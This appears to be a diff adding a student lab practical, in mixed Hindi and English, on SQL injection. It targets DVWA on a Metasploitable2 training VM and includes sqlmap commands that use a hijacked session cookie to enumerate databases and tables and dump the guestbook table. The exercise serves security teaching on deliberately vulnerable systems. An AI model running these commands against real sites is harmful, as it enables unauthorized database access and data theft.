@@ -1,0 +1,122 @@
+practical 8:
+
+PRACTICAL NO. 8 
+Aim: Practical on injecting Code in Data Driven Applications: SQL Injection
+
+STEP-BY-STEP EXPLANATION
+🔹 Step 1: Open DVWA in Kali Browser
+
+Metasploitable2 ka IP note karo
+(Metasploitable terminal me)
+
+ifconfig
+
+
+Kali Linux browser me open karo:
+
+http://<Metasploitable-IP>/
+
+🔹 Step 2: Login to DVWA
+
+Click DVWA
+
+Login:
+
+Username: admin
+
+Password: password
+
+🔹 Step 3: Set DVWA Security Level to LOW
+
+Left panel se:
+
+DVWA Security → Security Level = Low → Submit
+
+
+📌 Low security = no input validation
+📌 SQL injection easily possible
+
+🔹 Step 4: Open SQL Injection Page
+
+Left panel → SQL Injection
+
+Example vulnerable URL:
+
+http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+
+
+👉 Is URL ko copy karo (yehi target hai)
+
+🔹 Step 5: Copy PHPSESSID (VERY IMPORTANT)
+
+DVWA page par right click → Inspect
+
+Go to:
+
+Application / Storage → Cookies
+
+
+Copy value of:
+
+PHPSESSID
+
+
+📌 SQLmap ko authenticated session chahiye hota hai
+
+🧪 SQLMAP COMMANDS (CORE OF PRACTICAL)
+🟢 Step 6: List All Databases
+sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=<YOUR_SESSION_ID>; security=low" \
+--batch --dbs
+
+🔍 Matlab:
+
+-u → vulnerable URL
+
+--cookie → authenticated session
+
+--dbs → databases list karega
+
+--batch → auto yes (no prompts)
+
+👉 Output:
+
+mysql
+
+information_schema
+
+dvwa
+
+etc.
+
+🟢 Step 7: List Tables from DVWA Database
+sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=<SESSION_ID>; security=low" \
+-D dvwa --tables --batch
+
+🔍 Matlab:
+
+-D dvwa → dvwa database select
+
+--tables → tables list karega
+
+👉 Output:
+
+users
+
+guestbook
+
+🟢 Step 8: Dump Data from Guestbook Table
+sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=<SESSION_ID>; security=low" \
+-D dvwa -T guestbook --dump --batch
+
+🔍 Matlab:
+
+-T guestbook → table select
+
+--dump → data extract karega
+
+👉 Output:
+
+Guestbook entries (name, comment, etc.)
